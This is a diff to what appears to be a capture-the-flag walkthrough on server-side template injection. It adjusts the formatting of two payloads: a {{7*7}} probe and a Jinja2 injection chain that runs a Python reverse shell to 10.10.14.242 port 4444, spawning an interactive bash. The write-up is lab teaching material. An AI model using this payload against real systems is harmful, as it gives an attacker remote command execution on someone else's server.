@@ -111,7 +111,7 @@ As most of the web servers use php, python, java as backened programming languag
 
 Let’s try our injection using the following payload.
 
-`"{{7*7}}"`
+"{{7*7}}"
 
 if the webserver is vulnerable this would result in 49.
 
@@ -135,7 +135,7 @@ Let's use the following payload found [here](https://github.com/swisskyrepo/Payl
 
 Let's modify the payload with our IP and PORT to gain reverse shell.
 
-`"{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.242\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}"`
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.242\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}"
 
 Let's post it as a message
 
